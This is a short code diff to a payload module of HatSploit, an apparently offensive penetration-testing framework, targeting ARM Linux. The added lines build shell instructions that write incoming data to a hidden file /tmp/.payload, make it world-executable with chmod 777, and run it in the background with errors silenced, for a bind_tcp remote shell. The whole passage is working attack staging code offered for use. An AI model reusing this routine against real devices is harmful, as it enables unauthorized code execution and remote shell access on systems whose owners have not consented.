@@ -135,4 +135,14 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
         payload = self.payload_generator.generate(executable_format, 'armle', shellcode)
 
+        instructions = ""
+        instructions += "cat >/tmp/.payload;"
+        instructions += "chmod 777 /tmp/.payload;"
+        instructions += "sh -c '/tmp/.payload' 2>/dev/null &"
+        instructions += "\n"
+
+        self.payload = payload
+        self.instructions = instructions
+        self.actions = 'bind_tcp'
+
         return payload
